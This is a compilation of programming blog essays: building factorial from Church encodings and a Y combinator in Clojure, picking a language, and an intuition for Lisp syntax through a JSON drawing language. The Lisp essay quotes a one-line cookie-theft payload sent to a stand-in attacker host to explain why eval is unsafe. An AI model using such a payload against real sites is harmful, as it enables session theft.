Remember our `pair` data structure? Let's create a function for it
(we'll use this in just a moment below): `shift-and-inc`. All it would
do, is take pair of numbers, and "shift" the pair forward by one:

For example, applying `shift-and-inc` to `(0 1)`, would produce `(1 2)`.
One more time, it would produce `(2 3)`, and so on.

Sounds simple enough:

\[code\]

    (def shift-and-inc (fn [pair]
                         (church-pair
                           (church-second pair)
                           (church-inc (church-second pair)))))

\[/code\]

Bam, we take a pair. The second item is shifted over to the first
positions and is replaced with its `inc`ed friend. Let's try it out:

\[code\]

    (let [p (shift-and-inc (church-pair one two))]
      (map church-numeral->int [(church-first p) (church-second p)]))
    ; => (2 3)

\[/code\]

Works like a charm!

## 7: Dec: putting it together

Now that we have `shift-and-inc`, what if we did this:

\[code\]

    (def church-dec
      (fn [church-numeral]
        (church-first
          (church-numeral shift-and-inc
                          (church-pair zero zero)))))

\[/code\]

Remember that our `church-numeral` would call `shift-and-inc` N times,
representing its numeral value. If we started with a pair `(0, 0)`, then
what would the result be, if we composed `shift-and-inc` `N` times?

Our result would be the pair `(N-1, N)`. This means that if we take the
first part of our pair, we have `dec`!

\[code\]

    (church-numeral->int (church-dec (int->church-numeral 10)))
    ; => 9

\[/code\]

Nice.

## 8: Multiplication

Next up, multiplication. Say we multiply `a` by `b`. We'd need to
produce a church numeral that composes `f`, `a * b` times. To do that,
we can leverage the following idea:

Say we made a function `g`, which composes `f` *b* times. If we fed that
function to `a`, it would call `g`, *a* times.

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk2Mzc4MjI2LTdmOTFmYzAwLTExNTgtMTFlYi05MmY2LTVlZDdhNzA0YWE1MC5wbmc)

If `a` was "2" and "b" was 3, how many times would `f` get composed?
Well, `g` would be composed twice. Each time `g` is composed, `f` is
composed 3 times. That comes out to a total of 6 times!

Bam, if we did that, it would represent multiplication.

\[code\]

    (def church-*
      (fn [num-a num-b]
        (fn [f v]
          (num-a (partial num-b f) v))))

\[/code\]

Here, `(partial num-b f)` represents our `g` function.

\[code\]

    (church-numeral->int
        (church-* (int->church-numeral 5) (int->church-numeral 5)))
    => 25

\[/code\]

Works like a charm!

## 9: Booleans

We've got numbers, we've got `*` and we've got `dec`. Next
up...booleans!

To do this, we need to be creative about what `true` and `false` is.

Let's say this. Booleans are two argument functions:

\[code\]

    (def church-true (fn [when-true when-false]
                       when-true))

    (def church-false (fn [when-true when-false]
                        when-false))

\[/code\]

They take a "true" case and a "false" case. Our `church-true` function
would return the true case, and `church-false` function would return the
false case.

That's it. Surprisingly this is enough to handle booleans. Here's how we
could convert them to Clojure bools.

\[code\]

    (defn church-bool->bool [church-bool]
      (church-bool true false))

\[/code\]

Our `church-true` would return the first argument (true), and our
`church- false` would return the second one!

\[code\]

    (church-bool->bool church-true)
    ; => true
    (church-bool->bool church-false)
    ; => false

\[/code\]

Do they look familiar? Those are our `selector` functions for
`church-first` and `church-second`! We could interchange them if we
wished 😮

## 10: if

If you are like me, you were a bit suspicious of those booleans. Let's
put them to use and quiet our fears. Here's how could create an `if`
construct:

\[code\]

    (def church-if (fn [church-bool when-true when-false]
                     (church-bool when-true when-false)))

\[/code\]

All we do to make `if`, is to simply shuffle things around and provide
the `when-true` and `when-false` cases to our boolean! `church-true`
would return the `when-true` case, and `church-false` would return the
`when-false` case.

That would make `if` work pretty well:

\[code\]

    (church-numeral->int
        (church-if church-true one two))
    ; => 1
    (church-numeral->int
        (church-if church-false one two))
    ; => 2

\[/code\]

## 11: zero?

We have almost *all* the constructs we need to implement `factorial`.
One missing piece: `zero?`. We need a way to tell when a numeral is
zero.

The key trick is to remember that the `zero` numeral *never* calls `f`.

\[code\]

    (def zero (fn [f v] v))

\[/code\]

We can use that to our advantage, and create a `zero?` predicate like
this:

\[code\]

    (def church-zero?
      (fn [church-numeral]
        (church-numeral (fn [v] church-false) church-true)))

\[/code\]

If a number is greater than zero, `f` would be called, which would
replace `v` with `church-false`. Otherwise, we'd return the initial
value of `v`, `church- true`.

\[code\]

    (church-bool->bool (church-zero? zero))
    ; => true
    (church-bool->bool (church-zero? one))
    ; => false

\[/code\]

Wow...I think we're ready?

## 12: factorial-v0

Let's look at `factorial-clj` again:

\[code\]

    (defn factorial-clj [n]
      (if (zero? n)
        1
        (* n (factorial-clj (dec n)))))

\[/code\]

Well, we have `numerals`, we have `if`, we have `zero?` we have `*`, we
have `dec`. We could translate this:

\[code\]

    (def factorial-v0
      (fn [church-numeral-n]
        ((church-if
           (church-zero? church-numeral-n)
           (fn [] one)
           (fn []
             (church-*
               church-numeral-n
               (factorial-v0 (church-dec church-numeral-n))))))))

\[/code\]

Wow. That follows our recipe pretty much to a key.

The only weird thing is that we wrapped the `when-true` and `when-false`
cases in an anonymous function. This is because our `church-if` is a
little different than Clojure's `if`. Clojure's if *only* evaluates one
of the `when- true` and `when-false` cases. Ours evaluates both cases,
which triggers an infinite recursion. We avoid this by wrapping both
cases in a lambda, which "delays" the evaluation for us. \[2\]

Will it work?

\[code\]

    (church-numeral->int (factorial-v0 (int->church-numeral 5)))
    ; => 120

\[/code\]

Wow! 🤯 We did it

## 13: Broken rules

Okay, almost. We cheated. Remember our `Rule 3`: **If we replace our
variables with an anonymous function, everything should work well.**
What would happen if we wrote `factorial-v0` as an anonymous function?

\[code\]

    (fn [church-numeral-n]
      ((church-if
         (church-zero? church-numeral-n)
         (fn [] one)
         (fn []
           (church-*
             church-numeral-n
             ; :< :< :< :< uh oh
             (factorial-v0 (church-dec church-numeral-n)))))))

\[/code\]

Dohp. `factorial-v0` would not be defined.

Here's one way we can fix it. We could update this so `factorial` is
*provided as an argument to itself.*

\[code\]

    (fn [factorial-cb]
     (fn [church-numeral-n]
       ((church-if
          (church-zero? church-numeral-n)
          (fn [] one)
          (fn []
            (church-*
              church-numeral-n
              (factorial-cb (church-dec church-numeral-n)))))))
      ????)

\[/code\]

That *would work,* but we only punt the problem down. What the heck
would `????` be? We need some way to pass a reference of `factorial` to
*itself*!

## 14: Y-Combinator: Writing it out

Let's see if we can do make this work. First, let's write our factorial,
that accepts some kind of "injectable" version of itself:

\[code\]

    (def injectable-factorial
      (fn [factorial-cb]
        (fn [church-numeral-n]
          ((church-if
             (church-zero? church-numeral-n)
             (fn [] one)
             (fn []
               (church-*
                 church-numeral-n
                 (factorial-cb (church-dec church-numeral-n)))))))))

\[/code\]

If we can somehow provide that `factorial-cb`, we'd be golden.

To do that, let's create a `make-recursable` function, which accepts
this `injectable-f`

\[code\]

    (def make-recursable
      (fn [injectable-f]
        ????))

\[/code\]

Okay, all we did now is move the problem into this `make-recursable`
function 😅. Bear with me.

Let's imagine what the solution would need to look like. We'd want to
call `injectable-f` with some `factorial-cb` function handles the "next
call".

\[code\]

    (def make-recursable
      (fn [injectable-f]
        ; recursion-handler
        (injectable-f (fn [next-arg]
                        ????))))

\[/code\]

That seems right. Note the comment `recursion-handler` . This is in
reference to this form:

\[code\]

        (injectable-f (fn [next-arg]
                        ????)

\[/code\]

If we somehow had access to this form, we can use that in `????`! Well,
let's punt the problem down again:

\[code\]

    (def make-recursable
      (fn [injectable-f]
        (????
         (fn [recursion-handler]
           (injectable-f (fn [next-arg]
                           ((recursion-handler recursion-handler) next-arg)))))))

\[/code\]

Here, we wrap our `recursion-handler` into a function. If it could get a
copy of itself, we'd be golden. But that means we're back to the same
problem: how could we give `recursion-handler` a copy of itself?
**Here's one idea:**

\[code\]

     (def make-recursable
      (fn [injectable-f]
        ((fn [recursion-handler] (recursion-handler recursion-handler))
         (fn [recursion-handler]
           (injectable-f (fn [next-arg]
                           ((recursion-handler recursion-handler) next-arg)))))))

\[/code\]

Oh ma god. What did we just do?

## 15: Y-Combinator: Thinking it through

Let's walk through what happens:

The first time we called:

\[code\]

    (make-recursable injectable-factorial)

\[/code\]

this would run

\[code\]

    (fn [recursion-handler] (recursion-handler recursion-handler))

\[/code\]

`recursion-handler` would be:

\[code\]

    (fn [recursion-handler]
      (injectable-f (fn [next-arg]
                      ((recursion-handler recursion-handler) next-arg))))

\[/code\]

And `recursion-handler` would call itself:

\[code\]

    (recursion-handler recursion-handler)

\[/code\]

So now, this function would run:

\[code\]

    (fn [recursion-handler]
           (injectable-f (fn [next-arg]
                           ((recursion-handler recursion-handler) next-arg))))

\[/code\]

And this function's `recursion-handler` argument would be... **a
reference to itself!**

🔥🤯. Oh boy. Let's continue on.

Now this would run:

\[code\]

           (injectable-f (fn [next-arg]
                           ((recursion-handler recursion-handler) next-arg))

\[/code\]

`injectable-factorial` would be called, and it's `factorial-cb` function
would be this callback:

\[code\]

    (fn [next-arg]
      ((recursion-handler recursion-handler) next-arg))

\[/code\]

Whenever `factorial-cb` gets called with a new argument,

\[code\]

    (recursion-handler recursion-handler)

\[/code\]

This would end up producing a new `factorial` function that had a
`factorial- cb`. Then we would call that with `next-arg`, and keep the
party going!

Hard to believe. Let's see if it works:

\[code\]

    (def factorial-yc (make-recursable injectable-factorial))

\[/code\]

\[code\]

    (church-numeral->int (factorial-yc (int->church-numeral 5)))
    ; => 120
    (church-numeral->int (factorial-yc (int->church-numeral 10)))
    ; => 3628800

\[/code\]

**Very cool!**

This `make-recursable` function is also called the Y Combinator. You may
have heard a lot of stuff about it, and this example may be hard to
follow. If you want to learn more, I recommend [Jim's
keynote](https://www.youtube.com/watch?v=FITJMJjASUs&ab_channel=Confreaks).

## 16: Just Functions

Wow, we did it. We just wrote `factorial`, and *all we used were
anonymous functions.* To prove the point, let's remove some of our
rules. Here's how our code would end up looking without any variable
definitions:

\[code\]

    (church-numeral->int
      (((fn
          [injectable-f]
          ((fn [recursion-handler] (recursion-handler recursion-handler))
           (fn [recursion-handler] (injectable-f (fn [next-arg] ((recursion-handler recursion-handler) next-arg))))))
        (fn
          [factorial-cb]
          (fn
            [church-numeral-n]
            (((fn [church-bool when-true when-false] (church-bool when-true when-false))
              ((fn
                 [church-numeral]
                 (church-numeral (fn [v] (fn [when-true when-false] when-false)) (fn [when-true when-false] when-true)))
               church-numeral-n)
              (fn [] (fn [f v] (f ((fn [f v] v) f v))))
              (fn
                []
                ((fn [num-a num-b] (fn [f v] (num-a (partial num-b f) v)))
                 church-numeral-n
                 (factorial-cb
                   ((fn
                      [church-numeral]
                      ((fn [pair] (pair (fn [a b] a)))
                       (church-numeral
                         (fn
                           [pair]
                           ((fn [a b] (fn [selector] (selector a b)))
                            ((fn [pair] (pair (fn [a b] b))) pair)
                            ((fn [church-numeral] (fn [f v] (f (church-numeral f v)))) ((fn [pair] (pair (fn [a b] b))) pair))))
                         ((fn [a b] (fn [selector] (selector a b))) (fn [f v] v) (fn [f v] v)))))
                    church-numeral-n)))))))))
       ((fn [church-numeral] (fn [f v] (f (church-numeral f v))))
        ((fn [church-numeral] (fn [f v] (f (church-numeral f v))))
         ((fn [church-numeral] (fn [f v] (f (church-numeral f v)))) (fn [f v] (f ((fn [f v] (f ((fn [f v] v) f v))) f v))))))))

\[/code\]

\[code\]

    ; => 120

\[/code\]

😮

## Fin

Well, we just took our functions through the Mojave desert! We made
numbers, booleans, arithmetic, and recursion...all from anonymous
functions. I hope you had fun! If you'd like to see the code in full,
take a look at the [GH
repo](https://github.com/stopachka/church-%20factorial/blob/master/src/church_factorial.clj).

## Bonus: Fun with Macros

I'll leave with you with some Clojure macro fun. When the time came to
"replace" all our `defs` with anonymous functions, how did we do it?

In wimpier languages we might have needed to do some manual copy pastin
\[3\]. In lisp, we can use *macros.*

First, let's rewrite `def`. This version will "store" the source code of
every `def` as metadata:

\[code\]

    (defmacro def#
      "A light wrapper around `def`, that keeps track of the
      _source code_ for each definition

      This let's us _unwrap_ all the definitions later : >"
      [name v]
      `(do
         (def ~name ~v)
         (alter-meta! (var ~name) assoc :source {:name '~name :v '~v})
         (var ~name)))

\[/code\]

Then, we can create an `unwrap` function, that recursively replaces all
`def` symbols with with their corresponding source code:

\[code\]

    (defn expand
      "This takes a form like

      (church-numeral->int (factorial-yc (int->church-numeral 5)))

      And expands all the function definitions, to give
      us the intuition for how our 'lambda calculus' way would look!"
      [form]
      (cond
        (symbol? form)
        (if-let [source (some-> (str *ns* "/" form)
                                symbol
                                find-var
                                meta
                                :source)]
          (expand (:v source))
          form)

        (seq? form)
        (map expand form)

        :else form))

\[/code\]

Aand...voila:

![](https://stopa.io/api/image/firstFrame/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk2Mzc4NDE3LWMwZDZkYjgwLTExNTktMTFlYi04YmVlLWE4MTEwOTVkOTI5Yi5naWY)

To learn about what's going on there, check out [Macros by
Example](https://stopa.io/post/229)

------------------------------------------------------------------------

*Thanks to Alex Reichert, Daniel Woelfel, Sean Grove, Irakli Safareli,
Alex Kotliarskyi, Davit Magaltadze, Joe Averbukh for reviewing drafts of
this essay*

# How to Pick a Language

Say you\'re about to build a new project. You\'re an expert in a few
languages, and you have a sense of the ecosystem in general. How do you
choose the language you build with? I wanted to share my decision
framework with you.

## Start with Constraints

Some requirements can eliminate entire categories of choices. Let's use
that to our advantage: start by narrowing down your choices. For
example:

**Do you need extreme efficiency?** This would mean your code may need
to be compiled and that you can't have run-time garbage collection.
Well, that narrows down your choices quite a bit.

**Do you need math-level proofs that your code works as expected?** This
would mean you need an *extremely* strong type system. Bam, narrows
choices down quite a bit

**Do you need concurrency?** There are only a few VMs and a few
languages that are known to be *excellent* for concurrency. Depending on
what you need, this will narrow your choices down to a few families.

**Do you work in a larger environment?** If you are building something,
and your entire company is on one stack, there's so much power to the
existing ecosystem that this effectively narrows down your choice to the
language of your environment.\[1\]

**Is your problem in a domain where the ecosystem in one language is
strongest?** If you're in machine learning, the ecosystem in python is
so powerful that it almost guarantees to narrow down your choice to that
language.

**Is your problem a small script that needs to run everywhere?** This
narrows your choices down to the languages that are available by default
on Linux

Now, there's a leverage point here: constraints narrow down your choices
in a significant way. If you add a constraint you didn't need, you risk
sacrificing a large set of options. For example, many think their system
needs to scale from the get-go. This is rarely the case and kills some
of the choices that contributed to the success of the biggest companies
today \[2\]

So pick your constraints carefully. Once you do though, you'll be
pleasantly surprised with how much clarity they give you: your choices
will have gone through a significant filter.

## Optimize for Effectiveness

The next filter is effectiveness. Choose the language that maximizes
your output on a time scale you care about.

At this stage, there is often a tradeoff between what you're comfortable
with and what you need to discover. Say you're comfortable in assembly,
but don't know any other languages. What should you do?

Well, for some very small problems, it *does* make sense to just write
them in assembly. If they're urgent, you have no other choice. But for
any significant work, you'll outstrip the productivity of assembly
within a few days of ramp- up.

The same kind of spectrum exists in higher-level languages, but the
differences take longer to show up. If you're comfortable with Java, for
example, you can get a lot done pretty quickly. But within *some*
period, the productivity benefits pale in comparison to more powerful
languages.

Making this choice is a bit of an art, but it works like this. You want
to think about a time-frame that you'd like to optimize and pick the
language that optimizes for effectiveness within that timeframe.

If you're in a hurry, you have no choice but to use what you're
comfortable with, no matter how limiting. There are two ways to avoid
the dilemma. You can either play with different languages before you
start your project, so you have a wider array of comfortable choices to
pick from, or give yourself a few months to ramp up and select the
language that's most effective for your problem.

With that, the question comes, *what time frame* should you optimize
for? This is in itself an art. For startups, I would say about 8-12
months. Planning further than that is over-optimization. For larger
companies, I'd think 2-5 years.

## Break Ties with Fun

Now you've gone through two filters. Say you narrowed down to just a few
choices, but you aren't sure which one to take. How should you break the
tie?

I'd say fun. There are so many schleps in a startup that programming
should be as fun as possible. Once. I narrowed down. I'd choose the
language I'm most excited about.

------------------------------------------------------------------------

*Thanks to Sean Grove, Daniel Woelfel, Joe Averbukh, Alex Reichert for
reviewing drafts of this essay*

# An Intuition for Lisp Syntax

Every lisp hacker I ever met, myself included, thought that all those
brackets in Lisp were off-putting and weird. At first, of course. Soon
after we all came to the same epiphany: *lisp's power lies in those
brackets*! In this essay, we'll go on a journey to that epiphany.

## Draw

Say we were creating a program that let you draw stuff. If we wrote this
in JavaScript, we might have functions like this:

\[code\]

    drawPoint({x: 0, y: 1}, 'yellow')
    drawLine({x: 0, y: 0}, {x: 1, y: 1}, 'blue')
    drawCircle(point, radius, 'red')
    rotate(shape, 90)
    ...

\[/code\]

So far, so cool.

## Challenge

Now, here's a challenge: **Can we support remote drawing?**

This means that a user would be able to "send" instructions to your
screen, and you would see their drawing come to life.

How could we do it?

Well, say we set up a websocket connection. We could receive
instructions from the user like this:

\[code\]

    websocket.onMessage(data => { 
      /* TODO */ 
    })

\[/code\]

## Eval

To make it work off the bat, one option could be to take code strings as
input:

\[code\]

    websocket.onMessage(data => {
      eval(data)
    })

\[/code\]

Now the user could send `"drawLine({x: 0, y: 0}, {x: 1, y: 1}, 'red')"`
and bam: we'll draw a line!

But...your spidey sense may already be tingling. What if the user was
malicious and managed to send us an instruction like this:

\[code\]

    "window.location='http://iwillp3wn.com?user_info=' + document.cookie"

\[/code\]

Uh oh...our cookie would get sent to iwillp3wn.com, and the malicious
user would indeed pwn us. We can't use eval; it's too dangerous.

There lies our problem: we can't use `eval`, but we need some way to
receive arbitrary instructions.

## An initial idea

Well, we could represent those instructions as JSON. We can map each
JSON instruction to a special function, and that way we can control what
runs. Here's one way we can represent it:

\[code\]

    {
      instructions: [
        { functionName: "drawLine", args: [{ x: 0, y: 0 }, { x: 1, y: 1 }, "blue"] },
      ];
    }

\[/code\]

This JSON would translate to
`drawLine({x: 0, y: 0}, {x: 1, y: 1},"blue")`

We could support this pretty simply. Here's how our `onMessage` could
look:

\[code\]

    webSocket.onMessage(instruction => { 
      const fns = {
        drawLine: drawLine,
        ...
      };
      data.instructions.forEach((ins) => fns[ins.functionName](...ins.args));
    })

\[/code\]

That seems like it would work!

## An initial simplification

Let's see if we can clean this up. Here's our JSON:

\[code\]

    {
      instructions: [
        { functionName: "drawLine", args: [{ x: 0, y: 0 }, { x: 1, y: 1 }, "blue"] },
      ];
    }

\[/code\]

Well, since *every* instruction has a `functionName`, and an `args`, we
don't really need to spell that out. We *could* write it like this:

\[code\]

    {
      instructions: [["drawLine", { x: 0, y: 0 }, { x: 1, y: 1 }, "blue"]],
    }

\[/code\]

Nice! We changed our object in favor of an array. To handle that, all we
need is a rule: **the** ***first*** **part of our instruction is the
function name, and the *rest* are arguments.** If we wrote that down,
here's how our `onMessage` would look:

\[code\]

    websocket.onMessage(data => { 
      const fns = {
        drawLine: drawLine,
        ...
      };
      data.instructions.forEach(([fName, ...args]) => fns[fName](...args));
    })

\[/code\]

And bam, `drawLine` would work again!

## More power

So far, we only used `drawLine`:

\[code\]

    drawLine({x: 0, y: 0}, {x: 1, y: 1}, 'blue')
    // same as
    ["drawLine", { x: 0, y: 0 }, { x: 1, y: 1 }]

\[/code\]

But what if we wanted to express something more powerful:

\[code\]

    rotate(drawLine({x: 0, y: 0}, {x: 1, y: 1}, 'blue'), 90)

\[/code\]

Looking at that, we can translate it to an instruction like this:

\[code\]

    ["rotate", ["drawLine", { x: 0, y: 0 }, { x: 1, y: 1 }], 90]

\[/code\]

Here, the `rotate` instruction has an argument that is in *itself* an
instruction! Pretty powerful. Surprisingly, we just need to tweak our
code a tiny bit to make it work:

\[code\]

    websocket.onMessage(data => { 
      const fns = {
        drawLine: drawLine,
        ...
      };
      const parseInstruction = (ins) => {
        if (!Array.isArray(ins)) {
          // this must be a primitive argument, like {x: 0, y: 0}
          return ins;
        }
        const [fName, ...args] = ins;
        return fns[fName](...args.map(parseInstruction));
      };
      data.instructions.forEach(parseInstruction);
    })

\[/code\]

Nice, We introduce a `parseInstruction` function. We can apply
`parseInstruction` recursively to arguments, and support stuff like:

\[code\]

    ["rotate", ["rotate", ["drawLine", { x: 0, y: 0 }, { x: 1, y: 1 }], 90], 30]

\[/code\]

Very cool!

## Further simplification

Okay, let's look at our JSON again:

\[code\]

    {
      instructions: [["drawLine", { x: 0, y: 0 }, { x: 1, y: 1 }]],
    }

\[/code\]

Well, our data *only* contains instructions. Do we really need a key
called `instructions`?

What if we did this:

\[code\]

    ["do", ["drawLine", { x: 0, y: 0 }, { x: 1, y: 1 }]]

\[/code\]

Instead of a top-level key, we could have a special instruction called
`do`, which runs all the instructions it's given.

Here's one way we can implement it:

\[code\]

    websocket.onMessage(data => { 
      const fns = {
        ...
        do: (...args) => args[args.length - 1],
      };
      const parseInstruction = (ins) => {
        if (!Array.isArray(ins)) {
          // this must be a primitive argument, like {x: 0, y: 0}
          return ins;
        }
        const [fName, ...args] = ins;
        return fns[fName](...args.map(parseInstruction));
      };
      parseInstruction(instruction);
    })

\[/code\]

Oh wow, that was easy. We just added `do` in `fns`. Now we can support
an instruction like this:

\[code\]

    [
      "do",
      ["drawPoint", { x: 0, y: 0 }],
      ["rotate", ["drawLine", { x: 0, y: 0 }, { x: 1, y: 1 }], 90]],
    ];

\[/code\]

## Even more power

Let's make it more interesting. What if we wanted to support
*definitions?*

\[code\]

     const shape = drawLine({x: 0, y: 0}, {x: 1, y: 1}, 'red')
    rotate(shape, 90)

\[/code\]

If we could support definitions, our remote user could write some very
expressive instructions! Let's convert our code to the kind of data
structure we've been playing with:

\[code\]

    ["def", "shape", ["drawLine", { x: 0, y: 0 }, { x: 1, y: 1 }]]
    ["rotate", "shape", 90]

\[/code\]

Noot bad! If we can support an instruction like that, we'd be golden!
Here's how:

\[code\]

    websocket.onMessage(data => { 
      const variables = {};
      const fns = {
        ...
        def: (name, v) => {
          variables[name] = v;
        },
      };
      const parseInstruction = (ins) => {
        if (variables[ins]) {
          // this must be some kind of variable, like "shape"
          return variables[ins];
        }
        if (!Array.isArray(ins)) {
          // this must be a primitive argument, like {x: 0, y: 0}
          return ins;
        }
        const [fName, ...args] = ins;
        return fns[fName](...args.map(parseInstruction));
      };
      parseInstruction(instruction);
    })

\[/code\]

Here, we introduced a `variables` object, which keeps track of every
variable we define. A special `def` function updates that `variables`
object. Now we can run this instruction:

\[code\]

    [
      "do",
      ["def", "shape", ["drawLine", { x: 0, y: 0 }, { x: 1, y: 1 }]],
      ["rotate", "shape", 90],
    ];

\[/code\]

Not bad!

## Extreme Power: Goal

Let's step it up a notch. What if we let our remote user *define their
own functions?*

Say they wanted to write something like this:

\[code\]

    const drawTriangle = function(left, top, right, color) { 
       drawLine(left, top, color);
       drawLine(top, right, color); 
       drawLine(left, right, color); 
    } 
    drawTriangle(...)

\[/code\]

How would we do it? Let's follow our intuition again. If we transcribe
this to our data representation, here's how it could look:

\[code\]

      ["def", "drawTriangle",
      ["fn", ["left", "top", "right", "color"],
        ["do",
          ["drawLine", "left", "top", "color"],
          ["drawLine", "top", "right", "color"],
          ["drawLine", "left", "right", "color"],
        ],
      ],
    ],
    ["drawTriangle", { x: 0, y: 0 }, { x: 3, y: 3 }, { x: 6, y: 0 }, "blue"],

\[/code\]

Here,

\[code\]

    const drawTriangle = ...

\[/code\]

translates to

\[code\]

    ["def", "drawTriangle", …]. 

\[/code\]

And

\[code\]

    function(left, top, right, color) {…}

\[/code\]

translates to

\[code\]

    ["fn", ["left", "top", "right", "color"], ["do" ...]]

\[/code\]

All we need to do is to parse this instruction somehow, and bam, we are
good to go!

## Extreme Power: Key

The key to making this work is our `["fn", …]` instruction. What if we
did this:

\[code\]

    const parseFnInstruction = (args, body, oldVariables) => {
      return (...values) => {
        const newVariables = {
          ...oldVariables,
          ...mapArgsWithValues(args, values),
        };
        return parseInstruction(body, newVariables);
      };
    };

\[/code\]

When we find a `fn` instruction, we run `parseFnInstruction`. This
produces a new javascript function. We would replace `drawTriangle` here
with that function:

\[code\]

    ["drawTriangle", { x: 0, y: 0 }, { x: 3, y: 3 }, { x: 6, y: 0 }, "blue"]

\[/code\]

So when that function is run, `values` would become:

\[code\]

    [{ x: 0, y: 0 }, { x: 3, y: 3 }, { x: 6, y: 0 }, "blue"]

\[/code\]

After that,

\[code\]

    const newVariables = {...oldVariables, ...mapArgsWithValues(args, values)}

\[/code\]

Would create a new `variables` object, that includes a mapping of the
function arguments to these newly provided values:

\[code\]

    const newVariables = {
      ...oldVariables,
      left: { x: 0, y: 0 }, 
      top: { x: 3, y: 3 },
      right: {x: 6, y: 0 }, 
      color: "blue", 
    }

\[/code\]

Then, we can take the function body, in this case:

\[code\]

          [
            "do",
            ["drawLine", "left", "top", "color"],
            ["drawLine", "top", "right", "color"],
            ["drawLine", "left", "right", "color"],
          ],

\[/code\]

And run it through `parseInstruction`, with our `newVariables`. With
that `"left"` would be looked up as a variable and map to
`{x: 0, y: 0}`.

If we did that, voila, the major work to support functions would be
done!

## Extreme Power: Execution

Let's follow through on our plan. The first thing we need to do, is to
have `parseInstruction` accept `variables` as an argument. To do that,
we need to update `parseInstruction`, and wherever it\'s called:

\[code\]

      const parseInstruction = (ins, variables) => {
        ...
        return fn(...args.map((arg) => parseInstruction(arg, variables)));
      };
      parseInstruction(instruction, variables);

\[/code\]

Next, we'll want to add a special check to detect if we have a "fn"
instruction:

\[code\]

      const parseInstruction = (ins, variables) => {
        ...
        const [fName, ...args] = ins;
        if (fName == "fn") {
          return parseFnInstruction(...args, variables);
        }
        ...
        return fn(...args.map((arg) => parseInstruction(arg, variables)));
      };
      parseInstruction(instruction, variables);

\[/code\]

Now, our `parseFnInstruction`:

\[code\]

    const mapArgsWithValues = (args, values) => { 
      return args.reduce((res, k, idx) => {
        res[k] = values[idx];
        return res;
      }, {});
    }
    const parseFnInstruction = (args, body, oldVariables) => {
      return (...values) => {
        const newVariables = {...oldVariables, ...mapArgsWithValues(args, values)}
        return parseInstruction(body, newVariables);
      };
    };

\[/code\]

It works exactly like we said. We return a new function. When it's run,
it:

1.  Creates a `newVariables` object, that associates the `args` with
    `values`
2.  runs `parseInstruction` with the `body` and the new `variables`
    object

Okay, almost done. The final bit to make it all work:

\[code\]

      const parseInstruction = (ins, variables) => {
        ...
        const [fName, ...args] = ins;
        if (fName == "fn") {
          return parseFnInstruction(...args, variables);
        }
        const fn = fns[fName] || variables[fName];
        return fn(...args.map((arg) => parseInstruction(arg, variables)));

\[/code\]

The secret is this:

\[code\]

        const fn = fns[fName] || variables[fName];

\[/code\]

Here, since `fn` can now come from both `fns` and `variables`, we check
both. Put it all together, and it works!

\[code\]

    websocket.onMessage(data => { 
      const variables = {};
      const fns = {
        drawLine: drawLine,
        drawPoint: drawPoint,
        rotate: rotate,
        do: (...args) => args[args.length - 1],
        def: (name, v) => {
          variables[name] = v;
        },
      };
      const mapArgsWithValues = (args, values) => {
        return args.reduce((res, k, idx) => {
          res[k] = values[idx];
          return res;
        }, {});
      };
      const parseFnInstruction = (args, body, oldVariables) => {
        return (...values) => {
          const newVariables = {
            ...oldVariables,
            ...mapArgsWithValues(args, values),
          };
          return parseInstruction(body, newVariables);
        };
      };
      const parseInstruction = (ins, variables) => {
        if (variables[ins]) {
          // this must be some kind of variable
          return variables[ins];
        }
        if (!Array.isArray(ins)) {
          // this must be a primitive argument, like {x: 0, y: 0}
          return ins;
        }
        const [fName, ...args] = ins;
        if (fName == "fn") {
          return parseFnInstruction(...args, variables);
        }
        const fn = fns[fName] || variables[fName];
        return fn(...args.map((arg) => parseInstruction(arg, variables)));
      };
      parseInstruction(instruction, variables);
    })

\[/code\]

Holy jeez, with just this code, we can parse this:

\[code\]

    [
      "do",
      [
        "def",
        "drawTriangle",
        [
          "fn",
          ["left", "top", "right", "color"],
          [
            "do",
            ["drawLine", "left", "top", "color"],
            ["drawLine", "top", "right", "color"],
            ["drawLine", "left", "right", "color"],
          ],
        ],
      ],
      ["drawTriangle", { x: 0, y: 0 }, { x: 3, y: 3 }, { x: 6, y: 0 }, "blue"],
      ["drawTriangle", { x: 6, y: 6 }, { x: 10, y: 10 }, { x: 6, y: 16 }, "purple"],
    ])

\[/code\]

We can compose functions, we can define variables, and we can even
create our own functions. If we think about it, we just created a
programming language! \[1\].

## Try it out

Here's an example of our triangle 🙂

And here's a happy person!

## Surprises

We may even notice something interesting. Our new array language has
advantages to JavaScript itself!

### Nothing special

In JavaScript, you define variables by writing `const x = foo`. Say you
wanted to "rewrite" `const` to be just `c`. You couldn't do this,
because `const x = foo` is special syntax in JavaScript. You're not
allowed to change that around.

In our array language though, there's no syntax at all! Everything is
just arrays. We could easily write some special `c` instruction that
works just like `def`.

If we think about it, it's as though in Javascript we are guests, and we
need to follow the language designer's rules. But in our array language,
we are "co-owners". There is no big difference between the "built-in"
stuff ("def", "fn") the language designer wrote, and the stuff we write!
("drawTriangle").

### Code is Data

There's another, much more resounding win. If our code is just a bunch
of arrays, we can *do stuff* to the code. We could write code that
generates code!

For example, say we wanted to support `unless` in Javascript.

Whenever someone writes

\[code\]

    unless foo { 
       ...
    }

\[/code\]

We can rewrite it to

\[code\]

    if !foo { 
       ...
    }

\[/code\]

This would be difficult to do. We'd need something like Babel to parse
our file, and work on top of the AST to make sure we rewrite our code
safely to

\[code\]

    if !foo { 
      ...
    }

\[/code\]

But in our array language, our code is just arrays! It's easy to rewrite
`unless`:

\[code\]

    function rewriteUnless(unlessCode) {
       const [_unlessInstructionName, testCondition, consequent] = unlessCode; 
       return ["if", ["not", testCondition], consequent]
    }

\[/code\]

\[code\]

    rewriteUnless(["unless", ["=", 1, 1], ["drawLine"]])
    // => 
    ["if", ["not", ["=", 1, 1]], ["drawLine"]];

\[/code\]

Oh my god. Easy peasy.

## Editing with Structure

Having your code represented as data doesn't just allow you to
manipulate your code with ease. It also allows your editor to do it too.
For example, say you are editing this code:

\[code\]

    ["if", testCondition, consequent]

\[/code\]

You want to change `testCondition` to `["not", testCondition]`

You could bring your cursor over to `testCondition`

\[code\]

    ["if", |testCondition, consequent]

\[/code\]

Then create an array

\[code\]

    ["if", [|] testCondition, consequent]

\[/code\]

Now you can type "not"

\[code\]

    ["if", ["not", |] testCondition, consequent]

\[/code\]

If your editor understood these arrays, you can tell it: "expand" this
